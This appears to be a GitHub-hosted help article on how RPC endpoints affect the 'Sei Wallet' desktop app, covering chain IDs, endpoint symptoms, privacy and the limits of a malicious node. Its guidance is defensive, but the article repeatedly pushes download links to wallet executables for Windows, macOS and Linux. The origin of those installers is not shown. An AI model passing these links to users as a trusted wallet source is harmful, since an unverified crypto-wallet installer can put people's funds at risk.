![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">RPC endpoints for Sei Wallet and what they change</h1>

<p align="center">What an RPC endpoint does, and what changing it can and cannot fix.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

An RPC endpoint is the node your wallet talks to. Everything you see in the interface - balances, history, whether a transaction is pending - is that node's answer, not the chain's direct truth. When a wallet and a block explorer disagree, the endpoint is almost always why.

This matters more than it sounds, because most "my funds vanished" and "my transaction is stuck" reports are endpoint problems rather than chain problems.

## What the endpoint does

- **Reads state**: balance, nonce, contract data, transaction status.
- **Broadcasts transactions**: the wallet hands the signed transaction to the node, which relays it to the network.
- **Feeds the interface**: history lists, token metadata, fee estimates.

It does not hold your keys, cannot sign for you, and cannot move funds. It can, however, show you a false picture - which is enough to make you sign something you would not otherwise sign.

## Public endpoints versus your own

**A public endpoint** is operated by someone else, usually free, usually rate-limited. It is fine for ordinary use, and it is what most wallets ship with.

**A custom endpoint** is one you configure: a provider's URL, or a node you run. Reasons to use one: better reliability, no rate limits, or a preference for a specific operator.

**A self-hosted node** removes the third-party dependency entirely, at the cost of running infrastructure. It is the only option that makes the endpoint *yours* rather than *trusted*.

## What a bad endpoint looks like

<div align="center">

| Symptom | Likely cause |
|---|---|
| Balance shows zero on a funded account | Endpoint on the wrong network, or badly out of sync |
| Confirmed transaction shows as pending | Endpoint lagging behind the chain |
| Nonce errors on every attempt | Endpoint's view of your account is stale |
| Transactions never broadcast | Endpoint rejecting or rate-limiting you |
| Fee estimates wildly off | Endpoint's fee data is stale |

</div>

None of these is a chain failure, and none of them requires reinstalling anything. The check is to look the same transaction up on a block explorer: if the chain has it and the wallet does not, the endpoint is the problem.

## The one rule for custom endpoints

**The chain ID and the endpoint must describe the same network.** A mainnet chain ID pointed at a testnet endpoint gives you a wallet that connects and then fails on everything, which reads as a broken wallet rather than a misconfiguration.

Sei's mainnet is chain 1329 (`pacific-1`); testnet is 1328 (`atlantic-2`). [The chain ID](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md) covers the settings and how they are applied.

## Where to get them

Take endpoints from Sei's documentation, not from a search result, a chat message, or a list on a random site. Documentation is versioned and maintained; a link in a message has no chain of custody.

The same rule applies to any wallet's network form: if you cannot trace the URL to a source you trust, do not add it.

## Privacy, which nobody mentions

An RPC endpoint sees your queries. That means:

- **which addresses you are watching**, because you ask about them;
- **your IP address**, unless you are routing traffic in a way that hides it;
- **when you are active**, from the timing of your requests.

That is a real disclosure, and it is why "no telemetry" in a wallet's privacy claims does not mean the wallet's endpoint learns nothing. The endpoint is a separate party. If that matters to you, your own node is the only complete answer.

## What a malicious endpoint can and cannot do

**Cannot:** sign transactions, move funds, or read your seed phrase. Keys never leave the wallet.

**Can:** show false balances, false history, and false confirmations; return a contract address that is not the one you meant; estimate a fee that leaves your transaction stuck. It can make you approve something by lying about what you are looking at.

That is why the endpoint's trustworthiness matters even though it cannot steal directly. Theft needs a signature, and the endpoint's job in a scam is to make the signature look reasonable.

## Changing the setting

In an app that ships with its own configuration, endpoints are usually not something you touch unless you have a reason. In a general EVM wallet, the endpoint is one field of the network entry, alongside the chain ID.

If you switch endpoints:

1. Note the current one so you can revert.
2. Change only the URL, keeping chain ID 1329 if you are on mainnet.
3. Refresh and confirm the balance matches what an explorer shows.
4. Watch the next transaction's status in the explorer, not just in the wallet.

If the picture is worse after the change, revert - a bad endpoint is worse than a slow one.

## Testnet is a different endpoint

Testnet (1328) has its own RPC, its own explorer and its own assets. A mainnet endpoint will not show testnet transactions, and pointing a testnet configuration at mainnet produces the mismatch above.

If you are setting up for testing, testnet explorers are where your transactions will appear, and the faucet is where test coins come from.

## Common confusions

- **"A stuck transaction"** - most often the endpoint's view, not the chain. [A stuck transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) has the diagnostic sequence.
- **"Address forms"** - an endpoint indexes both `0x...` and `sei1...` forms of one account, but your wallet may only display one. Address forms explain why searching one can miss the other.
- **"The wallet is broken"** - compare with an explorer first; [the Sei Wallet block explorer guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/read-a-block-explorer.md) is the referee.
- **"MetaMask shows something different"** - a different endpoint, a different view, same chain. The MetaMask network entry is configured with the same fields.

## The wallet's network config

For this app, the endpoint is part of [the wallet's network config](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) rather than a per-transaction choice. You set it once and the interface reads through it.

The practical takeaway is not "change your endpoint" but "know that the endpoint is the source of what you see". When the display and the chain disagree, that knowledge turns a scary situation into a five-minute check.

## Frequently asked questions

**What is an RPC endpoint?** The node a wallet uses to read the chain and broadcast transactions. It is a service, not part of the chain.

**Is the default endpoint safe?** It is operated by a third party and can see your queries. It cannot sign for you. "Safe" depends on what you expect it to protect.

**Can an RPC steal my funds?** Not directly. It has no keys and cannot sign. It can mislead you into signing something else.

**Why does my wallet show a zero balance?** Most often the wrong network or a lagging endpoint. Check the chain ID, then check an explorer.

**Should I run my own node?** If you want the endpoint to be yours and to avoid disclosing your address queries to a third party. Otherwise a reputable public endpoint is normal practice.

**Do I need to change the endpoint to fix a stuck transaction?** Sometimes it reveals that nothing is stuck. The transaction may already be confirmed on chain while the wallet's node lags.

**Where do I get the real endpoint URL?** From Sei's documentation, which is maintained. Not from a message.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Chain ID 1329 and the Sei network settings in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md)
- [A pending or failed transaction in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Reading a Sei block explorer beside Sei Wallet activity](https://github.com/sei-chain/sei-wallet-staking/blob/main/read-a-block-explorer.md)
